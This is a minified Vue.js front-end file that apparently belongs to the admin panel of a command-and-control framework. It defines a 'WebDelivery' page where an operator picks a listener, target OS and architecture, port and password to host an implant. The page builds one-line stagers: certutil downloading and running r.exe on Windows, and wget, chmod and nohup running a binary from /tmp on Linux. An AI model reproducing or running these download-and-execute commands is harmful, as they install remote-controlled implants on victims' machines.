import{_ as q}from"./index-358683bb.js";/* empty css                  *//* empty css                   *//* empty css                *//* empty css                     *//* empty css                 *//* empty css               *//* empty css                  *//* empty css                 *//* empty css                    */import{C as c}from"./index-554f8593.js";import{a as n,o as J,t as K,r as Q,D as R,u as X,w as Y,x as Z,y as ee,z as ae,A as te,p as le,v as oe}from"./element-61b2a7f7.js";import{H as se,r as V,_ as W,d as ne,l as r,m as v,V as a,P as l,T as u,U as re,O as _,S as C,p as k,F as S,a8 as D,az as ie,aA as de}from"./vue-95bbca75.js";const L=f=>(ie("data-v-34fc2616"),f=f(),de(),f),ue=L(()=>k("br",null,null,-1)),pe=L(()=>k("br",null,null,-1)),me={class:"form-container"},ce=se({__name:"WebDelivery",setup(f){const x=V([]),w=V(!1),E=V([]),$=async()=>{const s=await c.ShowListener();s.status===200?s.data.status===200?E.value=s.data.data:n.error(s.data.data):n.error("Something wrong")},z=[{label:"windows",value:"windows"},{label:"linux",value:"linux"},{label:"darwin",value:"darwin"}],O={windows:["amd64","386"],linux:["amd64","386","arm","arm64","loong64","mips","mipsle","mips64","mips64le"],darwin:["amd64","arm64"]},o=W({port:"",listener:"",os:"",arch:"",filename:"",pass:""}),b=W([]),U=s=>{o.arch="",b.splice(0,b.length,...O[s]||[])},i=async()=>{const s=await c.GetWebDeliveryList();s.status===200?s.data.status===200?x.value=s.data.data:n.error(s.data.data):n.error("Something wrong")},I=async()=>{const s=await c.StartWebDelivery({listener:o.listener,os:o.os,arch:o.arch,port:o.port,filename:o.filename,pass:o.pass});s.status===200?s.data.status===200?(n.success("添加成功"),await i()):n.error(s.data.data):n.error("Something wrong"),w.value=!1},A=async s=>{const t=await c.CloseWebDelivery({port:s.ListeningPort});t.status===200&&(t.data.status===200?(n.success("关闭成功"),await i()):(await i(),n.error(t.data.data)))},F=async s=>{const t=await c.OpenWebDelivery({port:s.ListeningPort});t.status===200&&(t.data.status===200?(n.success("开启成功"),await i()):(await i(),n.error(t.data.data)))},N=async s=>{const t=await c.DeleteWebDelivery({port:s.ListeningPort});t.status===200&&(t.data.status===200?(n.success("删除成功"),await i()):(await i(),n.error(t.data.data)))};return ne(async()=>{await i()}),(s,t)=>{const p=J,d=K,B=Q,T=R,M=X,y=oe,g=Y,m=Z,h=ee,G=ae,H=te,j=le;return r(),v("div",null,[a(p,{type:"primary",size:"default",onClick:t[0]||(t[0]=e=>w.value=!0)},{default:l(()=>[u(" 新增 WebDelivery ")]),_:1}),ue,pe,a(M,{data:x.value},{default:l(()=>[a(d,{prop:"ListenerConfig",label:"Listener"}),a(d,{prop:"OS",label:"操作系统",width:"150"}),a(d,{prop:"Arch",label:"架构",width:"150"}),a(d,{prop:"Pass",label:"上线密码",width:"150"}),a(d,{prop:"ListeningPort",label:"监听端口",width:"150"}),a(d,{label:"状态",prop:"Status",width:"150"},{default:l(({row:e})=>[a(B,{type:e.Status===1?"success":"danger",size:"default"},{default:l(()=>[u(re(e.Status===1?"开启":"关闭"),1)]),_:2},1032,["type"])]),_:1}),a(d,{label:"操作"},{default:l(e=>[a(T,{placement:"top",width:500,trigger:"click",content:e.row.os==="windows"?`certutil -urlcache -split -f ${e.row.ServerAddress} C:\\temp\\r.exe && C:\\temp\\r.exe ${e.row.Pass}`:`wget -P /tmp ${e.row.ServerAddress}; chmod +x /tmp/${e.row.FileName}; nohup /tmp/${e.row.FileName} ${e.row.Pass} > m.log 2>&1 &`},{reference:l(()=>[e.row.Status===1?(r(),_(p,{key:0,size:"small",type:"success"},{default:l(()=>[u("上线命令")]),_:1})):C("",!0)]),_:2},1032,["content"]),e.row.Status===2?(r(),_(p,{key:0,size:"small",type:"success",onClick:P=>F(e.row)},{default:l(()=>[u("开启")]),_:2},1032,["onClick"])):C("",!0),e.row.Status===1?(r(),_(p,{key:1,size:"small",type:"primary",onClick:P=>A(e.row)},{default:l(()=>[u("关闭")]),_:2},1032,["onClick"])):C("",!0),a(p,{size:"small",type:"danger",onClick:P=>N(e.row)},{default:l(()=>[u("删除")]),_:2},1032,["onClick"])]),_:1})]),_:1},8,["data"]),a(j,{modelValue:w.value,"onUpdate:modelValue":t[7]||(t[7]=e=>w.value=e),title:"配置WebDelivery"},{default:l(()=>[a(H,{class:"box-card"},{default:l(()=>[k("div",me,[a(G,{model:o,"label-width":"120px"},{default:l(()=>[a(m,{label:"Listener"},{default:l(()=>[a(g,{modelValue:o.listener,"onUpdate:modelValue":t[1]||(t[1]=e=>o.listener=e),placeholder:"选择listener",onVisibleChange:$},{default:l(()=>[(r(!0),v(S,null,D(E.value,e=>(r(),_(y,{key:e,label:e,value:e},null,8,["label","value"]))),128))]),_:1},8,["modelValue"])]),_:1}),a(m,{label:"操作系统"},{default:l(()=>[a(g,{modelValue:o.os,"onUpdate:modelValue":t[2]||(t[2]=e=>o.os=e),placeholder:"选择操作系统",onChange:U},{default:l(()=>[(r(),v(S,null,D(z,e=>a(y,{key:e.value,label:e.label,value:e.value},null,8,["label","value"])),64))]),_:1},8,["modelValue"])]),_:1}),a(m,{label:"架构"},{default:l(()=>[a(g,{modelValue:o.arch,"onUpdate:modelValue":t[3]||(t[3]=e=>o.arch=e),placeholder:"选择架构",disabled:b.length===0},{default:l(()=>[(r(!0),v(S,null,D(b,e=>(r(),_(y,{key:e,label:e,value:e},null,8,["label","value"]))),128))]),_:1},8,["modelValue","disabled"])]),_:1}),a(m,{label:"上线密码"},{default:l(()=>[a(h,{modelValue:o.pass,"onUpdate:modelValue":t[4]||(t[4]=e=>o.pass=e),style:{width:"220px"},placeholder:"输入上线密码"},null,8,["modelValue"])]),_:1}),a(m,{label:"监听端口"},{default:l(()=>[a(h,{modelValue:o.port,"onUpdate:modelValue":t[5]||(t[5]=e=>o.port=e),style:{width:"200px"},placeholder:"输入监听端口"},null,8,["modelValue"])]),_:1}),a(m,{label:"文件名称"},{default:l(()=>[a(h,{modelValue:o.filename,"onUpdate:modelValue":t[6]||(t[6]=e=>o.filename=e),style:{width:"200px"},placeholder:"输入挂载的文件名称"},null,8,["modelValue"])]),_:1})]),_:1},8,["model"]),a(p,{type:"primary",onClick:I,disabled:!o.os||!o.arch},{default:l(()=>[u(" 确定 ")]),_:1},8,["disabled"])])]),_:1})]),_:1},8,["modelValue"])])}}});const xe=q(ce,[["__scopeId","data-v-34fc2616"]]);export{xe as default};
